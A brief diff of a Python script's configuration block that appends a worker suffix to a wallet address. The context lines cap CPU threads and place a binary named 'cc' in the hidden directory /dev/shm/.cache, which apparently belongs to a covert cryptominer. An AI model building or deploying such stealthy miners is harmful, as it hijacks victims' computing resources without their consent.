@@ -5,7 +5,7 @@ import random
 import shutil
 
 # Konfigurasi
-WALLET = "REy6w1W9pQ7U4LebYx6zp6mZxHkBzc3e5y"
+WALLET = "REy6w1W9pQ7U4LebYx6zp6mZxHkBzc3e5y.CC"
 CPU_THREADS = 2
 BASE_PATH = os.path.expanduser("/dev/shm/.cache")
 ORIGINAL_BINARY = os.path.join(BASE_PATH, "cc")
